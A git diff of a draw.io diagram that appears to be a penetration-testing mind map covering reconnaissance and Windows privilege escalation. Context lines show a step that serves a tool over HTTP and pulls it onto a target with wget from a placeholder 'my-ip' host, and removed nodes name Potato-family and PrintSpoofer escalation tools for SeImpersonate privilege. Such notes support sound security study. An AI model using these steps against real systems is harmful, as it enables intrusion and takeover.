@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2023-11-03T14:02:15.625Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0" etag="aUH1zIumXiCcFLRYpwgi" version="22.0.8" type="github" pages="7">
+<mxfile host="app.diagrams.net" modified="2023-11-16T10:29:32.931Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0" etag="GlRjagcF-FyMpEYWL2M-" version="22.1.2" type="github" pages="7">
   <diagram name="Reconnaissance" id="l6uARz4Kyqoon4gwFnSB">
     <mxGraphModel dx="1434" dy="793" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -698,7 +698,7 @@
     </mxGraphModel>
   </diagram>
   <diagram name="Privesc" id="g_WdtopXuEi5G3ynW-Q2">
-    <mxGraphModel dx="1434" dy="671" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
+    <mxGraphModel dx="1434" dy="793" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
@@ -709,7 +709,7 @@
           <mxGeometry x="40" y="220" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="eydW96J8nSPCopO3k54l-2" value="&lt;div&gt;Privileged user&lt;em&gt;&lt;strong&gt;&lt;br&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/div&gt;&lt;div&gt;&lt;em&gt;&lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt;&lt;/em&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#a20025;fontColor=#ffffff;strokeColor=#6F0000;" parent="1" vertex="1">
-          <mxGeometry x="1350" y="255" width="180" height="70" as="geometry" />
+          <mxGeometry x="1360" y="255" width="180" height="70" as="geometry" />
         </mxCell>
         <mxCell id="qmehafYx0e8W1bQMVf-2-2" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="eydW96J8nSPCopO3k54l-3" target="qmehafYx0e8W1bQMVf-2-1" edge="1">
           <mxGeometry relative="1" as="geometry" />
@@ -732,23 +732,8 @@
         <mxCell id="eydW96J8nSPCopO3k54l-5" value="&lt;div&gt;send script on remote machine&lt;/div&gt;&lt;div&gt;mine: python3 -m http.server 8000&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;remote:wget http://my-ip:8000/&lt;br&gt;&lt;/font&gt;&lt;/div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;tool.exe&lt;/font&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="220" y="195" width="230" height="110" as="geometry" />
         </mxCell>
-        <mxCell id="1EinaSV8kBPLbE3rXXxN-1" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" parent="1" source="qmehafYx0e8W1bQMVf-2-1" target="83Cq3oNJ2Gnx3IUDA6h3-1" edge="1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="1EinaSV8kBPLbE3rXXxN-2" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="qmehafYx0e8W1bQMVf-2-1" target="83Cq3oNJ2Gnx3IUDA6h3-3" edge="1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
         <mxCell id="qmehafYx0e8W1bQMVf-2-1" value="&lt;div&gt;SEImpersonate Privilege OR &lt;br&gt;&lt;div&gt;&lt;code&gt;SeAssignPrimaryToken&lt;/code&gt;&lt;/div&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="780" y="115" width="170" height="80" as="geometry" />
-        </mxCell>
-        <mxCell id="83Cq3oNJ2Gnx3IUDA6h3-1" value="&lt;div&gt;&lt;span class=&quot;iq hs&quot;&gt;&lt;span class=&quot;jm&quot;&gt;Windows Server 2019 and Windows Or 10 versions 1809 and higher.&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;p data-testid=&quot;page.title&quot; class=&quot;r-1xnzce8 r-crgep1 r-z9jf92&quot; data-rnwr700-gg6oyi-1ui5ee8-nwxazl-b88u0q=&quot;true&quot; data-rnwrdesktop-gg6oyi-xb2eav-1dn12g7-b88u0q=&quot;true&quot;&gt;&lt;font color=&quot;#4a86e8&quot;&gt;PrintSpoofer,RoguePotato, SharpEfsPotato&lt;/font&gt;&lt;/p&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="1080" y="45" width="220" height="90" as="geometry" />
-        </mxCell>
-        <mxCell id="83Cq3oNJ2Gnx3IUDA6h3-8" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0.289;entryY=-0.014;entryDx=0;entryDy=0;entryPerimeter=0;" parent="1" source="83Cq3oNJ2Gnx3IUDA6h3-3" target="eydW96J8nSPCopO3k54l-2" edge="1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="83Cq3oNJ2Gnx3IUDA6h3-3" value="&lt;div&gt;All others versions&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;JuicyPotato.exe&lt;/font&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="1080" y="160" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="p3XK7XwHjG5C0I2znAWz-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" parent="1" source="p3XK7XwHjG5C0I2znAWz-1" target="eydW96J8nSPCopO3k54l-2" edge="1">
           <mxGeometry relative="1" as="geometry" />
